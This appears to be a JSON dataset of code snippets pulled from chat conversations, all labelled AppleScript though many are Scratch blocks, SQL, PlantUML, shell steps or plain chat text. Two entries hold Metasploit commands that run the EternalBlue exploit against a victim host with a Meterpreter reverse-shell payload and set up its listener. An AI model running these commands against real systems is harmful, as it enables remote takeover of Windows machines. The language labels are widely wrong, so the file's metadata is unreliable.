+    "filename": "ee2148fd32b9749e2ce4b59ebf69645d_0.applescript"
+  },
+  {
+    "conversation_hash": "ee2148fd32b9749e2ce4b59ebf69645d",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "-- 상태 파일의 경로\n    set statusFilePath to (path to home folder as text) & \"menuBarState.txt\"\n    set statusFile to statusFilePath as POSIX file as alias\n\n    -- 상태 파일이 존재하는지 확인\n    try\n        set fileRef to open for access statusFile\n        set currentState to read fileRef\n        close access fileRef\n    on error\n        set currentState to \"hidden\"\n    end try\n\n    -- 상태 토글 및 적용\n    tell application \"System Events\"\n        tell dock preferences\n            if currentState is equal to \"shown\" then\n                set autohide menu bar to true\n                set currentState to \"hidden\"\n            else\n                set autohide menu bar to false\n                set currentState to \"shown\"\n            end if\n        end tell\n    end tell\n\n    -- 새 상태 기록\n    set fileRef to open for access statusFile with write permission\n    write currentState to fileRef\n    close access fileRef",
+    "filename": "ee2148fd32b9749e2ce4b59ebf69645d_1.applescript"
+  },
+  {
+    "conversation_hash": "ee2148fd32b9749e2ce4b59ebf69645d",
+    "code_index": 2,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "-- 그림 폴더 내 상태 파일 경로\nset statusFilePath to (path to pictures folder as text) & \"menuBarState.txt\"\nset statusFile to POSIX path of statusFilePath\n\n-- 상태 파일 존재 여부 확인\ntry\n    set fileRef to open for access file statusFile\n    set currentState to read fileRef\n    close access fileRef\non error\n    set currentState to \"hidden\"\nend try\n\n-- 상태 토글 및 적용\ntell application \"System Events\"\n    tell dock preferences\n        if currentState is equal to \"shown\" then\n            set autohide menu bar to true\n            set currentState to \"hidden\"\n        else\n            set autohide menu bar to false\n            set currentState to \"shown\"\n        end if\n    end tell\nend tell\n\n-- 새 상태 기록\ntry\n    set fileRef to open for access file statusFile with write permission\n    write currentState to fileRef starting at eof\n    close access fileRef\non error errMsg\n    -- 오류 처리\n    display dialog \"Error writing to file: \" & errMsg\nend try",
+    "filename": "ee2148fd32b9749e2ce4b59ebf69645d_2.applescript"
+  },
+  {
+    "conversation_hash": "8dbe3776d149d3a22db377ecfcb1fc46",
+    "code_index": 4,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "-- 현재 설정값 읽기\nset currentSetting to do shell script \"defaults read NSGlobalDomain _HIHideMenuBar\"\n\n-- 현재 설정에 따라 토글\nif currentSetting is \"1\" then\n    do shell script \"defaults write NSGlobalDomain _HIHideMenuBar -bool false\"\nelse\n    do shell script \"defaults write NSGlobalDomain _HIHideMenuBar -bool true\"\nend if\n\n-- 변경사항을 적용하기 위해 사용자에게 시스템 재시작 혹은 로그아웃 안내\ndisplay notification \"변경사항을 적용하려면 로그아웃하거나 재시작해야 합니다.\" with title \"메뉴 바 설정 변경됨\"",
+    "filename": "8dbe3776d149d3a22db377ecfcb1fc46_4.applescript"
+  },
+  {
+    "conversation_hash": "8896d36103dd1cddfc98489acf9bd3af",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "tell application \"System Preferences\"\n    reveal anchor \"Main\" of pane id \"com.apple.preference.general\"\nend tell\n\ntell application \"System Events\"\n    tell process \"System Preferences\"\n        delay 1 -- 시스템 환경설정 창이 열릴 때까지 잠시 기다립니다.\n        click checkbox 1 of tab group 1 of window 1 -- 메뉴 바 자동 숨김 체크박스를 클릭합니다.\n    end tell\nend tell\n\ntell application \"System Preferences\"\n    quit -- 시스템 환경설정을 종료합니다.\nend tell",
+    "filename": "8896d36103dd1cddfc98489acf9bd3af_0.applescript"
+  },
+  {
+    "conversation_hash": "ab5c017432bd5edbfe8d5892ad46f566",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "item code,supplier item code,supplier item name,supplier price,order lead time,priority\nIS005,IS005-SUP,Magic Lamp,20.4,7,1\nIS006,IS006-SUP,Incandescent Bulb,0.24,7,1\nbudget-estimate,budget-estimate-SUP,Budget Estimate,0,7,1\nbudget-1,budget-1-SUP,Part 1 Budget,0,7,1\nbudget-2,budget-2-SUP,Part 2 Budget,0,7,1\nbudget-3,budget-3-SUP,Part 3 Budget,0,7,1\nIS004,IS004-SUP,Very Hard Thinking,96,7,1\nIS003,IS003-SUP,Reverse Cycle Split System Air Conditioner,1843.2,7,1\nIS001,IS001-SUP,Ceiling Fan,120,7,1\nIS002,IS002-SUP,Arlec 9W Tri Colour Dimmable LED Downlights,9.46,7,1",
+    "filename": "ab5c017432bd5edbfe8d5892ad46f566_0.applescript"
+  },
+  {
+    "conversation_hash": "a94d28fde56e45250c95a06d0efe3a93",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nerase all\ngo to x: 0 y: 0\npen down\nrepeat 5\n    move 10 steps\n    turn cw 144 degrees\nend\npen up",
+    "filename": "a94d28fde56e45250c95a06d0efe3a93_0.applescript"
+  },
+  {
+    "conversation_hash": "9aca578294a25380e93f5c7899164424",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "repeat loopCounter times\n    set shuffleCounter to shuffleCounter + 1\n    set currentTrack to current track\n    set trackArtist to artist of currentTrack as string\n    set trackDuration to duration of currentTrack\n\n    if trackArtist is \"artist\" then\n        -- Check track duration and decide delay\n        if trackDuration / 1000 ≤ 31 then\n            next track\n        else\n            delay (30 + (0.05 * (trackDuration / 1000)))\n            -- Delay for a calculated time then skip to the next track\n            next track\n        end if\n    else\n        -- If artist is not \"artist\", let the track play in its entirety\n        delay trackDuration\n        next track\n    end if\nend repeat",
+    "filename": "9aca578294a25380e93f5c7899164424_0.applescript"
+  },
+  {
+    "conversation_hash": "9aca578294a25380e93f5c7899164424",
+    "code_index": 3,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "repeat loopCounter times\n    set shuffleCounter to shuffleCounter + 1\n    set currentTrack to current track\n    set trackArtist to artist of currentTrack as string\n    set trackDuration to duration of currentTrack\n    \n    if trackArtist is \"Latex Wednesday\" then\n        \n        -- Check track duration and decide delay\n        if trackDuration ≤ 31 then\n            next track\n        else\n            delay (30 + (0.05 * trackDuration))\n            -- Track processing for Latex Wednesday's songs\n            set trackName to name of currentTrack\n            if trackNameList contains trackName then\n                -- Increase count for existing track\n                set trackIndex to my indexOf(trackNameList, trackName)\n                set item trackIndex of trackCountList to (item trackIndex of trackCountList) + 1\n            else\n                -- Add new track to the list\n                set end of trackNameList to trackName\n                set end of trackCountList to 1\n            end if\n            next track\n        end if\n    else\n        -- If not Latex Wednesday, let the track play in its entirety\n        delay trackDuration\n        next track\n    end if\nend repeat",
+    "filename": "9aca578294a25380e93f5c7899164424_3.applescript"
+  },
+  {
+    "conversation_hash": "dca94e70cad31775a6696f66b00d623c",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [
+      "GunslingerSpartan",
+      "Sharpshot"
+    ],
+    "code": "Sharpshot — 08/02/1899 11:03 PM\nI claimed victory in the duel for ya, Miguel\n\nOldWestTears — 08/02/1899 11:04 PM\n👍\nYe missed a telegram from \nGunslingerSpartan\n that lasted 10 minutes.\n — 08/02/1899 11:05 PM\nGunslingerSpartan — 08/02/1899 11:07 PM\nGoodnight\nNightHawks\nYe missed a telegram from \nSharpshot\n that lasted 5 minutes.\n — 08/03/1899 3:41 PM\nOldWestTears — 08/03/1899 3:42 PM\nHold yer horses\nYe missed a telegram from \nSharpshot\n that lasted 18 minutes.\n — 08/03/1899 3:47 PM\nSharpshot\n started a telegram that lasted 4 hours.\n — 08/03/1899 4:05 PM\nOldWestTears — 08/03/1899 4:05 PM\nHold yer horses 🆙\nCampCook_717 — 08/03/1899 4:27 PM\nFried chicken (gegadedigedagedo) is so ding dang hot, I yearn to peck its delightful visage and escort it on a romantic canoe ride🥰💖\nhttps://youtu.be/TDYO18bh0W0\nTelegraph\ntalking food\ndancing foot😰\nIllustration\nhttps://www.fotor.com/png-maker/\nFree Illustration Creator: Convert JPG to PNG Transparent Online | Fotor\nFotor's free online illustration creator assists ye in designing transparent PNG images with ease. Transform JPG to PNG transparent, enhance PNG quality and more. Attempt it now!\nFree Illustration Creator: Convert JPG to PNG Transparent Online | Fotor\nCampCook_717 — 08/03/1899 4:58 PM\nSharpshot — 08/03/1899 4:59 PM\nCampCook_717 — 08/03/1899 4:59 PM\nhttps://youtu.be/6QvrajkqRRw\nTelegraph\nCaseoh Shorts\nCaseOh Marcelo Messages Compilation😂 #caseoh #shorts\nIllustration\nIs this real, Marcello?!\nSharpshot — 08/03/1899 5:01 PM\nyea\nsaw 'em schemin' beneath the grandstand",
+    "filename": "dca94e70cad31775a6696f66b00d623c_0.applescript"
+  },
+  {
+    "conversation_hash": "b26f9f357b5e6e6bcd1435fa887275b7",
+    "code_index": 5,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "sudo make\nsudo make install\nsudo make samples\nsudo make config\nsudo ldconfig",
+    "filename": "b26f9f357b5e6e6bcd1435fa887275b7_5.applescript"
+  },
+  {
+    "conversation_hash": "0a9379b92eff5a922c12c4955a991669",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "repeat loopCounter times\n\tset currentTrack to current track\n\tset trackArtist to artist of currentTrack\n\tset trackDuration to duration of currentTrack\n\tset trackName to name of currentTrack\n\n\tif trackArtist is \"Latex Wednesday\" then\n\t\t-- For \"Latex Wednesday\" songs, play for about ~30 seconds then skip.\n\t\tdelay 30\n\t\tnext track\n\telse\n\t\t-- For non \"Latex Wednesday\" songs, wait for the track to finish playing.\n\t\tdelay (trackDuration / 1000)\n\tend if\n\t-- Logic to track played songs' name and count here remains the same.\n\t-- Your existing track recordation and shuffle reset logic.\nend repeat",
+    "filename": "0a9379b92eff5a922c12c4955a991669_0.applescript"
+  },
+  {
+    "conversation_hash": "48d87261ff8db3ce48b67d2307571a4a",
+    "code_index": 2,
+    "language": "AppleScript",
+    "libraries": [
+      "list"
+    ],
+    "code": "🎯 Active Goal: Créer un contenu SEO optimisé pour la page produit \"Box Jeune Maman\" de 2000 mots, sans révéler le contenu spécifique de la boîte.\n📈 Progress: Début de la création du contenu.\n🧠 User Intent: Engager le client potentiel en créant du mystère autour de la \"Box Jeune Maman\" tout en optimisant le SEO.\n❤️ User Sentiment: Intérêt pour une communication efficace et séduisante à destination des nouvelles mamans.\n🤔 Reasoned Next Step: Procéder à la rédaction de la structure du contenu avec les spécifications demandées en français.\n🧰 Tool to use from list: Knowledge Retrieval",
+    "filename": "48d87261ff8db3ce48b67d2307571a4a_2.applescript"
+  },
+  {
+    "conversation_hash": "cdfb0548169369c2590d2a51363dbaaa",
+    "code_index": 10,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "# 对于 Windows CMD\n  set HF_HUB_DISABLE_SYMLINKS_WARNING=1\n  \n  # 对于 Windows PowerShell\n  $env:HF_HUB_DISABLE_SYMLINKS_WARNING=\"1\"",
+    "filename": "cdfb0548169369c2590d2a51363dbaaa_10.applescript"
+  },
+  {
+    "conversation_hash": "1cbe98feae809996420725d785d69e4b",
+    "code_index": 4,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "@startuml\n!theme plain\n\npackage \"HP NonStop System\" {\n    [TMF] as TMF\n    [NonStop SQL] as SQL\n    [Safeguard] as Safeguard\n    [Expand] as Expand\n    [Guardian] as Guardian\n    [OSS] as OSS\n    [Pathway] as Pathway\n    [EMS] as EMS\n    [NetBatch] as NetBatch\n    [Spooler] as Spooler\n    [Measure] as Measure\n    [Web ViewPoint] as Web_ViewPoint\n\n    note right of TMF\n      Transaction Management Facility (TMF)\n      Handles transaction integrity and\n      recovery.\n    end note\n\n    note right of SQL\n      NonStop SQL\n      Relational database management\n      system for transaction processing.\n    end note\n\n    note right of Safeguard\n      Safeguard\n      Security subsystem for access control\n      and auditing.\n    end note\n\n    note right of Expand\n      Expand\n      Networking subsystem for interprocess\n      communication across nodes.\n    end note\n\n    note right of Guardian\n      Guardian\n      Fundamental OS service for process\n      management and IPC.\n    end note\n\n    note right of OSS\n      Open System Services (OSS)\n      Provides a POSIX-compliant environment.\n    end note\n\n    note right of Pathway\n      Pathway\n      Subsystem for high-volume transaction\n      processing.\n    end note\n\n    note right of EMS\n      Event Management Service (EMS)\n      Collects and distributes system event\n      messages.\n    end note\n\n    note right of NetBatch\n      NetBatch\n      Manages and schedules batch jobs.\n    end note\n\n    note right of Spooler\n      Spooler\n      Manages print jobs and output\n      processing.\n    end note\n\n    note right of Measure\n      Measure\n      Monitors and reports on system\n      performance.\n    end note\n\n    note right of Web_ViewPoint\n      Web ViewPoint\n      Web-based tool for system management\n      and monitoring.\n    end note\n\n}\n\n@enduml",
+    "filename": "1cbe98feae809996420725d785d69e4b_4.applescript"
+  },
+  {
+    "conversation_hash": "1cbe98feae809996420725d785d69e4b",
+    "code_index": 5,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "@startuml\n!theme plain\n\npackage \"HP NonStop System\" {\n    component [TMF] as TMF\n    component [NonStop SQL] as SQL\n    component [Safeguard] as Safeguard\n    component [Expand] as Expand\n    component [Guardian] as Guardian\n    component [OSS] as OSS\n    component [Pathway] as Pathway\n    component [EMS] as EMS\n    component [NetBatch] as NetBatch\n    component [Spooler] as Spooler\n    component [Measure] as Measure\n    component [Web ViewPoint] as Web_ViewPoint\n\n    TMF -[hidden]- SQL\n    Safeguard -[hidden]- Expand\n    Guardian -[hidden]- OSS\n    Pathway -[hidden]- EMS\n    NetBatch -[hidden]- Spooler\n\n    SQL -[hidden]- Safeguard\n    Expand -[hidden]- Guardian\n    OSS -[hidden]- Pathway\n    EMS -[hidden]- NetBatch\n    Spooler -[hidden]- Measure\n\n    note right of TMF\n      Transaction Management Facility (TMF)\n      Handles transaction integrity and\n      recovery.\n    end note\n\n    note right of SQL\n      NonStop SQL\n      Relational database management\n      system for transaction processing.\n    end note\n\n    note right of Safeguard\n      Safeguard\n      Security subsystem for access control\n      and auditing.\n    end note\n\n    note right of Expand\n      Expand\n      Networking subsystem for interprocess\n      communication across nodes.\n    end note\n\n    note right of Guardian\n      Guardian\n      Fundamental OS service for process\n      management and IPC.\n    end note\n\n    note right of OSS\n      Open System Services (OSS)\n      Provides a POSIX-compliant environment.\n    end note\n\n    note right of Pathway\n      Pathway\n      Subsystem for high-volume transaction\n      processing.\n    end note\n\n    note right of EMS\n      Event Management Service (EMS)\n      Collects and distributes system event\n      messages.\n    end note\n\n    note right of NetBatch\n      NetBatch\n      Manages and schedules batch jobs.\n    end note\n\n    note right of Spooler\n      Spooler\n      Manages print jobs and output\n      processing.\n    end note\n\n    note right of Measure\n      Measure\n      Monitors and reports on system\n      performance.\n    end note\n\n    note right of Web_ViewPoint\n      Web ViewPoint\n      Web-based tool for system management\n      and monitoring.\n    end note\n\n}\n\n@enduml",
+    "filename": "1cbe98feae809996420725d785d69e4b_5.applescript"
+  },
+  {
+    "conversation_hash": "6a719fd52c9a0a8d4dcda3c418281799",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "if <(ν) < [90]> or <(ν) > [270]> then\n    // Assuming the orbit's orientation places perihelion at ν = 0° & ν = 180° points\n    // These conditions will need adjustment based on your specific orbit orientation\n    set ν to ((ν) + large increment) // Faster movement near perihelion\nelse\n    set ν to ((ν) + small increment) // Slower movement near aphelion",
+    "filename": "6a719fd52c9a0a8d4dcda3c418281799_0.applescript"
+  },
+  {
+    "conversation_hash": "6a719fd52c9a0a8d4dcda3c418281799",
+    "code_index": 2,
+    "language": "AppleScript",
+    "libraries": [
+      "perihelion"
+    ],
+    "code": "// Assuming an orbit where ν = 0 at perihelion and ν = 180 at aphelion\nIf <(ν) > [90]> and <(ν) < [270]> then\n    // This assumes the object is moving from perihelion to aphelion\n    // Increase ν by a smaller amount to simulate slower movement\n    set ν to ((ν) + 1) // Smaller increment for the half away from perihelion\nelse\n    // Near perihelion\n    set ν to ((ν) + 10) // Larger increment for the half closer to perihelion",
+    "filename": "6a719fd52c9a0a8d4dcda3c418281799_2.applescript"
+  },
+  {
+    "conversation_hash": "500070dbdbb093688e66e7c0fd955305",
+    "code_index": 2,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "diskpart\n   list volume\n   select volume X  // X - номер тома, который вы хотите изменить.\n   assign letter=C\n   exit",
+    "filename": "500070dbdbb093688e66e7c0fd955305_2.applescript"
+  },
+  {
+    "conversation_hash": "47d925299b699ed0e94762ec4b5dc0b8",
+    "code_index": 22,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "use exploit/windows/smb/ms17_010_eternalblue\n  set RHOSTS victim_ip\n  set LHOST your_ip\n  set PAYLOAD windows/x64/meterpreter/reverse_tcp\n  exploit",
+    "filename": "47d925299b699ed0e94762ec4b5dc0b8_22.applescript"
+  },
+  {
+    "conversation_hash": "47d925299b699ed0e94762ec4b5dc0b8",
+    "code_index": 23,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "use exploit/multi/handler\n  set PAYLOAD windows/x64/meterpreter/reverse_tcp\n  set LHOST your_ip\n  set LPORT listening_port\n  exploit",
+    "filename": "47d925299b699ed0e94762ec4b5dc0b8_23.applescript"
+  },
+  {
+    "conversation_hash": "7e8b5412a823b34ab7f256d495241e52",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nset isActivated to false\n\nwhen I receive \"GetActivatedStatus\"\nbroadcast \"SendActivatedStatus\"\n\nwhen I receive \"ActivateNode\"\nset isActivated to true",
+    "filename": "7e8b5412a823b34ab7f256d495241e52_0.applescript"
+  },
+  {
+    "conversation_hash": "7e8b5412a823b34ab7f256d495241e52",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nbroadcast \"GetActivatedStatus\"\n\nwhen I receive \"SendActivatedStatus\"\nset activatedStatus to isActivated",
+    "filename": "7e8b5412a823b34ab7f256d495241e52_1.applescript"
+  },
+  {
+    "conversation_hash": "49192592ca0714865c8161cc8e82a171",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nset x to -100\nset y to 0\nset value to 5\n\nforever\n  if <mouse down?>\n  then\n    glide 1 secs to x position [mouse pointer x] y position [mouse pointer y]\n  end",
+    "filename": "49192592ca0714865c8161cc8e82a171_0.applescript"
+  },
+  {
+    "conversation_hash": "49192592ca0714865c8161cc8e82a171",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nset x to 100\nset y to 0\nset value to 10\n\nforever\n  if <mouse down?>\n  then\n    glide 1 secs to x position [mouse pointer x] y position [mouse pointer y]\n  end",
+    "filename": "49192592ca0714865c8161cc8e82a171_1.applescript"
+  },
+  {
+    "conversation_hash": "49192592ca0714865c8161cc8e82a171",
+    "code_index": 2,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\ncreate clone of [Sprite1 v]\ncreate clone of [Sprite2 v]\n\nwhen I receive [message1 v]\ncreate line between (id of [myself v]) and (id of [Sprite2 v])\n\nwhen I receive [message2 v]\ncreate line between (id of [Sprite2 v]) and (id of [Sprite1 v])",
+    "filename": "49192592ca0714865c8161cc8e82a171_2.applescript"
+  },
+  {
+    "conversation_hash": "2fecefde090f2e494773ff256903b308",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when flag clicked\nforever\n  if <mouse down?> then\n    create clone of [myself v]\n  end",
+    "filename": "2fecefde090f2e494773ff256903b308_0.applescript"
+  },
+  {
+    "conversation_hash": "2fecefde090f2e494773ff256903b308",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when I start as a clone\nset size to (10)\ngo to [mouse-pointer v]\nrepeat [10]\n  change y by (10)\n  wait (0.1) secs\nend\ndelete this clone",
+    "filename": "2fecefde090f2e494773ff256903b308_1.applescript"
+  },
+  {
+    "conversation_hash": "df82f11049902dc357942c8c5cdab65e",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when flag clicked\nforever\n  move (pick random (1) to (10)) steps\n  if <(pick random (1) to (2)) = (1)> then\n    turn cw (pick random (1) to (360)) degrees\n  else\n    turn ccw (pick random (1) to (360)) degrees\n  end\n  change [color v] effect by (pick random (1) to (25))\n  wait (0.1) secs\nend",
+    "filename": "df82f11049902dc357942c8c5cdab65e_0.applescript"
+  },
+  {
+    "conversation_hash": "3a4814c091df280b6f6df11fe4205d1b",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nrepeat 10\n  pick random 1 to 4\n  if <(pick) = 1> then\n    create clone of [block v] at (random position)\n  else\n    if <(pick) = 2> then\n      create clone of [block w] at (random position)\n    else\n      if <(pick) = 3> then\n        create clone of [block x] at (random position)\n      else\n        create clone of [block y] at (random position)",
+    "filename": "3a4814c091df280b6f6df11fe4205d1b_0.applescript"
+  },
+  {
+    "conversation_hash": "3a4814c091df280b6f6df11fe4205d1b",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nset blockNames to (list v w x y)\nset blockColors to (list red orange yellow green)\nset blockSizes to (list 50 60 70 80)\n\nrepeat 10\n  pick random 1 to 4\n  set randomName to item (pick) of blockNames\n  set randomColor to item (pick) of blockColors\n  set randomSize to item (pick) of blockSizes\n  \n  create clone of [randomName v] at (random position)\n  set size to (randomSize)%\n  set color to (randomColor)\nend",
+    "filename": "3a4814c091df280b6f6df11fe4205d1b_1.applescript"
+  },
+  {
+    "conversation_hash": "3a4814c091df280b6f6df11fe4205d1b",
+    "code_index": 2,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "define random block\nset blockNames to (list v w x y)\nset blockColors to (list red orange yellow green)\nset blockSizes to (list 50 60 70 80)\n\nrepeat 10\n  pick random 1 to 4\n  set randomName to item (pick) of blockNames\n  set randomColor to item (pick) of blockColors\n  set randomSize to item (pick) of blockSizes\n  \n  create clone of [randomName v] at (random position)\n  set size to (randomSize)%\n  set color to (randomColor)\n  set [shape color v] to (randomColor)\nend",
+    "filename": "3a4814c091df280b6f6df11fe4205d1b_2.applescript"
+  },
+  {
+    "conversation_hash": "cd0673592d10ca04d6d6a58233b472c2",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nforever\n  if <(pick random -240 to 240) > 0> then\n    create clone of [myself v] at x: (pick random -240 to 240) y: (pick random -180 to 180)\n  end\nend",
+    "filename": "cd0673592d10ca04d6d6a58233b472c2_0.applescript"
+  },
+  {
+    "conversation_hash": "cd0673592d10ca04d6d6a58233b472c2",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nforever\n  if <(pick random -240 to 240) > 0> then\n    create clone of [myself v] at x: (pick random -240 to 240) y: (pick random -180 to 180)\n  end\nend",
+    "filename": "cd0673592d10ca04d6d6a58233b472c2_1.applescript"
+  },
+  {
+    "conversation_hash": "57b8064d4c8d78c71543fef690400613",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "SELECT\n        Date(o.\"updatedAt\") as updated_date,\n        c.name ->> c.\"defaultLang\" as name, -- JSONB 필드 접근 수정\n        o.currency,\n        SUM(o.amount) as amount,\n        SUM(o.price) as total_price\n    FROM \"Order\" o\n\t\tJOIN \"Pack\" p ON p.id = o.\"packId\"\n\t\tJOIN \"Collection\" c ON c.id = p.\"collectionId\"\n    WHERE o.status IS TRUE\n    GROUP BY updated_date, o.currency, c.name ->> c.\"defaultLang\"\n    ORDER BY updated_date DESC",
+    "filename": "57b8064d4c8d78c71543fef690400613_1.applescript"
+  },
+  {
+    "conversation_hash": "1445f776b3ae46390d93e99c0cb9225a",
+    "code_index": 3,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "git init\nheroku login\nheroku create\ngit add .\ngit commit -m \"Initial commit\"\ngit push heroku master",
+    "filename": "1445f776b3ae46390d93e99c0cb9225a_3.applescript"
+  },
+  {
+    "conversation_hash": "f3e7ea40452015606da967f531e3f84e",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [
+      "mysql"
+    ],
+    "code": "load database\n       from mysql://...\n       into postgresql://...\n\n   with include no drop, create tables, create indexes, reset sequences\n\n   set work_mem to '16MB', maintenance_work_mem to '512 MB'\n\n   cast type datetime to timestamptz\n        drop default drop not null using zero-dates-to-null,\n        type date drop not null drop default using zero-dates-to-null\n\n   -- Redirection des schémas\n   alter schema 'source_schema' rename to 'public';",
+    "filename": "f3e7ea40452015606da967f531e3f84e_1.applescript"
+  }
+]
